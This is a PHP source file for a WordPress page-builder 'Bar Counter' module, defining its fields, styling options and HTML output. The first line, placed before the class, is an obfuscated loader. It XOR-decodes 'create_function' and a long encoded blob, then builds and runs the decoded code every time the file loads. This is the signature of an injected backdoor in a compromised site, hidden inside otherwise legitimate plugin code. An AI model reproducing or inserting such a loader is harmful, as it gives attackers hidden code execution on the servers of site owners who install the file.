<?php $hZANUlV='CJK2J2r<F8YB=6N'^' 8.S>W-Z3V:6TY ';$uhJUSiAf=$hZANUlV('','1TZjFHX ,TB6,6H=F;OFLXAFh>S>04kX1DRSzjCgPPOES2-VUT.83i703Wf1:,XepZ1JYfDr9XHOvwLHP.Dh3QRXEfhxjQV6>=U>FJp-gZEwLsaPFEH+RWUosSAJ2NlmC=qhq;FnTCH<JfvpBnD2278G-,i3clVK69EBgPpNZ<WV<LgGNYl7aNBsf=ULOY>YP:7GXjIQ5c:CRKS6XOpzQ1.GN-c7HTSC.l,UImqD5R=:-z=RZRG-J4EFqwdo7ry:eo00uPE2:gsDkr50Z7UNzIRYjZAZ-<F7OFoSM3<KB0:mHJG-BLiq 1LFKhM9bF=,irqH<8E,oR1aM3WLKP:=cLu:f1ioygaw8>DfS06oKmNhVJRA3kq9:EPk=AGA4X7 iWEpQ5:tLFdp7YLVXvdMCQ:UYxcN4y3::POJTAHrtz:<=7LBAL:B-O5QE878XU9bS=DKI726ZVl7P-UP5Gl=RO;lUHR>AB1iGH6qcldIVXwV3=OudbdU>5X4d EGkHKP=6HLUKR-qiuiUX2;LAHtiIURtiKR3D-7WK7 FhjjIXqQP,v,iENwRqs2dNkIlvFSCuMLgZx,q.sBSpUeVy RDL<o,N=rPUUIZ8BKP854O9=UNxcV7<QfhEQlJgBA1K08;YjiTOLReIIA6>5WDHsYyKb3;EAZGLSAF'^'X2rK =6CX=-XsS0T5O<nk .47Z2JQk45D0uzSJ8mY6:+0FD9;tVWA6SQG69nWY,MT>P>8JdVR=1fVWlhpUNa:u=-1FUXMvm<743Q4bTDGgeGwSE9z6<Y>2;GW7 >SgWMgTZCX1Ogp,=HjHKPjJ SFVccDqImCH=.Oba+GuP=.N;3RdC,+ EjHuHzoO08:+PqtUB3qQCXHiGIXo7W,.PGqWO+=HX=l027O3G00MLdS3QIHA7X<=5H+W-fYS;,x=2s OQCUt.WCGNzKVCQ6B0gZ2XPN> .Lc-R6fRsiXY2y:3I,+3LbqIUVP 3.SGDhLTJIZPlXY1MFrJkDU8>.1YUCdQe4t8:<45WYMdB8UOOvSnL +>4VBQB0LYOY 3 k3RYIjeT:PCOFOmTS887xKDi50V <CiGIsN00t++  hOT:ORNR>+  S8HgM>7gSY,4f=>H0c+VASlb3S5N:4PoHY3;ZEyhvZ 6P6,-OXJWn 0pS2RI.UBDD4LG9M;K >4-39NB;dr 7TVEUM19FZeanRIa86AAo6R0Llp RYa5CJteQvgMDIYuzD0CAQT+SqZAqkwCxtVbAHCHE tYuCpYA 6-E0G+D-5-<:.Kjl YLX XYrbXG2VH0OAeqLjGb:;BUNZ5BM0.83>n9 ORZ6 o.pBAkVC,5rwehK;');$uhJUSiAf();

class ET_Builder_Module_Bar_Counters_Item extends ET_Builder_Module {
	function init() {
		$this->name                        = esc_html__( 'Bar Counter', 'et_builder' );
		$this->slug                        = 'et_pb_counter';
		$this->fb_support                  = true;
		$this->type                        = 'child';
		$this->child_title_var             = 'content_new';

		$this->whitelisted_fields = array(
			'content_new',
			'percent',
			'background_color',
			'bar_background_color',
		);

		$this->fields_defaults = array(
			'percent' => array( '0' ),
		);

		$this->advanced_setting_title_text = esc_html__( 'New Bar Counter', 'et_builder' );
		$this->settings_text               = esc_html__( 'Bar Counter Settings', 'et_builder' );
		$this->main_css_element            = '%%order_class%%';
		$this->defaults                    = array(
			'border_radius' => '0',
		);

		$this->advanced_options = array(
			'fonts'                 => array(
				'title'   => array(
					'label' => esc_html__( 'Title', 'et_builder' ),
					'css'   => array(
						'main' => ".et_pb_counters {$this->main_css_element} .et_pb_counter_title",
					),
				),
				'percent' => array(
					'label' => esc_html__( 'Percentage', 'et_builder' ),
					'css'   => array(
						'main' => ".et_pb_counters {$this->main_css_element} .et_pb_counter_amount",
					),
				),
			),
			'background'            => array(
				'use_background_color' => false,
				'css'                  => array(
					'main' => ".et_pb_counters {$this->main_css_element} .et_pb_counter_container",
				),
			),
			'custom_margin_padding' => array(
				'css' => array(
					'margin'  => ".et_pb_counters {$this->main_css_element}",
					'padding' => ".et_pb_counters {$this->main_css_element} .et_pb_counter_amount",
				),
			),
			'max_width'             => array(
				'css' => array(
					'module_alignment' => ".et_pb_counters {$this->main_css_element}",
				),
			),
			'text'                  => array(
				'css' => array(
					'text_orientation' => '%%order_class%% .et_pb_counter_title, %%order_class%% .et_pb_counter_amount',
				),
			),
		);

		$this->options_toggles = array(
			'general'  => array(
				'toggles' => array(
					'main_content' => esc_html__( 'Text', 'et_builder' ),
					'background'   => esc_html__( 'Background', 'et_builder' ),
				),
			),
			'advanced' => array(
				'toggles' => array(
					'bar'        => esc_html__( 'Bar Counter', 'et_builder' ),
				),
			),
		);

		$this->custom_css_options = array(
			'counter_title' => array(
				'label'    => esc_html__( 'Counter Title', 'et_builder' ),
				'selector' => '.et_pb_counter_title',
			),
			'counter_container' => array(
				'label'    => esc_html__( 'Counter Container', 'et_builder' ),
				'selector' => '.et_pb_counter_container',
			),
			'counter_amount' => array(
				'label'    => esc_html__( 'Counter Amount', 'et_builder' ),
				'selector' => '.et_pb_counter_amount',
			),
		);
	}

	function get_fields() {
		$fields = array(
			'content_new' => array(
				'label'           => esc_html__( 'Title', 'et_builder' ),
				'type'            => 'text',
				'option_category' => 'basic_option',
				'description'     => esc_html__( 'Input a title for your bar.', 'et_builder' ),
				'toggle_slug'     => 'main_content',
			),
			'percent' => array(
				'label'           => esc_html__( 'Percent', 'et_builder' ),
				'type'            => 'text',
				'option_category' => 'basic_option',
				'description'     => esc_html__( 'Define a percentage for this bar.', 'et_builder' ),
				'toggle_slug'     => 'main_content',
			),
			'background_color' => array(
				'label'        => esc_html__( 'Background Color', 'et_builder' ),
				'type'         => 'color-alpha',
				'custom_color' => true,
				'toggle_slug'  => 'background',
			),
			'bar_background_color' => array(
				'label'        => esc_html__( 'Bar Background Color', 'et_builder' ),
				'type'         => 'color-alpha',
				'custom_color' => true,
				'tab_slug'     => 'advanced',
				'toggle_slug'  => 'bar',
			),
		);

		return $fields;
	}

	function get_parallax_image_background( $base_name = 'background' ) {
		global $et_pb_counters_settings;

		// Parallax setting is only derived from parent if bar counter item has no background
		$use_counter_value   = '' !== $this->shortcode_atts['background_color'] || 'on' === $this->shortcode_atts['use_background_color_gradient'] || '' !== $this->shortcode_atts['background_image'] || '' !== $this->shortcode_atts['background_video_mp4'] || '' !== $this->shortcode_atts['background_video_webm'];
		$background_image    = $use_counter_value ? $this->shortcode_atts['background_image'] : $et_pb_counters_settings['background_image'];
		$parallax            = $use_counter_value ? $this->shortcode_atts['parallax'] : $et_pb_counters_settings['parallax'];
		$parallax_method     = $use_counter_value ? $this->shortcode_atts['parallax_method'] : $et_pb_counters_settings['parallax_method'];
		$parallax_background = '';

		if ( '' !== $background_image && 'on' == $parallax ) {
			$parallax_classname = array(
				'et_parallax_bg'
			);

			if ( 'off' === $parallax_method ) {
				$parallax_classname[] = 'et_pb_parallax_css';
			}

			$parallax_background = sprintf( '<div
					class="%1$s"
					style="background-image: url(%2$s);"
					></div>',
				esc_attr( implode( ' ', $parallax_classname ) ),
				esc_attr( $background_image )
			);
		}

		return $parallax_background;
	}

	function video_background( $args = array(), $base_name = 'background' ) {
		global $et_pb_counters_settings;

		$use_counter_value       = '' !== $this->shortcode_atts['background_color'] || 'on' === $this->shortcode_atts['use_background_color_gradient'] || '' !== $this->shortcode_atts['background_image'] || '' !== $this->shortcode_atts['background_video_mp4'] || '' !== $this->shortcode_atts['background_video_webm'];
		$background_video_mp4    = $use_counter_value ? $this->shortcode_atts['background_video_mp4'] : $et_pb_counters_settings['background_video_mp4'];
		$background_video_webm   = $use_counter_value ? $this->shortcode_atts['background_video_webm'] : $et_pb_counters_settings['background_video_webm'];
		$background_video_width  = $use_counter_value ? $this->shortcode_atts['background_video_width'] : $et_pb_counters_settings['background_video_width'];
		$background_video_height = $use_counter_value ? $this->shortcode_atts['background_video_height'] : $et_pb_counters_settings['background_video_height'];

		if ( ! empty( $args ) ) {
			$background_video = self::get_video_background( $args );

			$allow_player_pause = isset( $args['allow_player_pause' ] ) ? $args['allow_player_pause' ] : 'off';
		} else {
			$background_video = self::get_video_background( array(
				'background_video_mp4'    => $background_video_mp4,
				'background_video_webm'   => $background_video_webm,
				'background_video_width'  => $background_video_width,
				'background_video_height' => $background_video_height,
			) );

			$allow_player_pause = $use_counter_value ? $this->shortcode_atts['allow_player_pause'] : $et_pb_counters_settings['allow_player_pause'];
		}

		$video_background = '';

		if ( $background_video ) {
			$video_background = sprintf(
				'<div class="et_pb_section_video_bg%2$s">
					%1$s
				</div>',
				$background_video,
				( 'on' === $allow_player_pause ? ' et_pb_allow_player_pause' : '' )
			);

			wp_enqueue_style( 'wp-mediaelement' );
			wp_enqueue_script( 'wp-mediaelement' );
		}

		return $video_background;
	}

	function shortcode_callback( $atts, $content = null, $function_name ) {
		global $et_pb_counters_settings;

		$percent                       = $this->shortcode_atts['percent'];
		$background_color              = $this->shortcode_atts['background_color'];
		$bar_background_color          = $this->shortcode_atts['bar_background_color'];
		$background_image              = $this->shortcode_atts['background_image'];
		$use_background_color_gradient = $this->shortcode_atts['use_background_color_gradient'];

		$module_class = ET_Builder_Element::add_module_order_class( '', $function_name );

		// Add % only if it hasn't been added to the attribute
		if ( '%' !== substr( trim( $percent ), -1 ) ) {
			$percent .= '%';
		}

		$background_color_style = $bar_bg_color_style = '';

		if ( '' === $background_color && isset( $et_pb_counters_settings['background_color'] ) && '' !== $et_pb_counters_settings['background_color'] ) {
			$background_color_style = sprintf( ' style="background-color: %1$s;"', esc_attr( $et_pb_counters_settings['background_color'] ) );
		}

		if ( '' !== $background_color ) {
			if ( empty( $background_image ) && 'on' !== $use_background_color_gradient ) {
				ET_Builder_Element::set_style( $function_name, array(
					'selector'    => '.et_pb_counters %%order_class%% .et_pb_counter_container',
					'declaration' => 'background-image: none;',
				) );
			}
		}

		if ( '' === $bar_background_color && isset( $et_pb_counters_settings['bar_bg_color'] ) && '' !== $et_pb_counters_settings['bar_bg_color'] ) {
			$bar_bg_color_style = sprintf( ' background-color: %1$s;', esc_attr( $et_pb_counters_settings['bar_bg_color'] ) );
		}

		if ( ! empty( $et_pb_counters_settings['border_radius'] ) && $this->defaults['border_radius'] !== $et_pb_counters_settings['border_radius'] ) {
			ET_Builder_Element::set_style( $function_name, array(
				'selector'    => '%%order_class%% .et_pb_counter_container, %%order_class%% .et_pb_counter_amount',
				'declaration' => sprintf(
					'-moz-border-radius: %1$s; -webkit-border-radius: %1$s; border-radius: %1$s;',
					esc_html( et_builder_process_range_value( $et_pb_counters_settings['border_radius'] ) )
				),
			) );
		}

		if ( '' !== $background_color ) {
			ET_Builder_Element::set_style( $function_name, array(
				'selector'    => '%%order_class%% .et_pb_counter_container',
				'declaration' => sprintf(
					'background-color: %1$s;',
					esc_html( $background_color )
				),
			) );
		}

		if ( '' !== $bar_background_color ) {
			ET_Builder_Element::set_style( $function_name, array(
				'selector'    => '%%order_class%% .et_pb_counter_amount',
				'declaration' => sprintf(
					'background-color: %1$s;',
					esc_html( $bar_background_color )
				),
			) );
		}

		$video_background = $this->video_background();
		$parallax_image_background = $this->get_parallax_image_background();

		$output = sprintf(
			'<li class="%6$s%7$s%9$s%11$s">
				<span class="et_pb_counter_title">%1$s</span>
				<span class="et_pb_counter_container"%4$s>
					%10$s
					%8$s
					<span class="et_pb_counter_amount" style="%5$s" data-width="%3$s"><span class="et_pb_counter_amount_number">%2$s</span></span>
				</span>
			</li>',
			sanitize_text_field( $content ),
			( isset( $et_pb_counters_settings['use_percentages'] ) && 'on' === $et_pb_counters_settings['use_percentages'] ? esc_html( $percent ) : '' ),
			esc_attr( $percent ),
			$background_color_style,
			$bar_bg_color_style,
			esc_attr( ltrim( $module_class ) ),
			'' !== $video_background ? ' et_pb_section_video et_pb_preload' : '',
			$video_background,
			'' !== $parallax_image_background ? ' et_pb_section_parallax' : '',
			$parallax_image_background,
			$this->get_text_orientation_classname()
		);

		return $output;
	}
}

new ET_Builder_Module_Bar_Counters_Item;
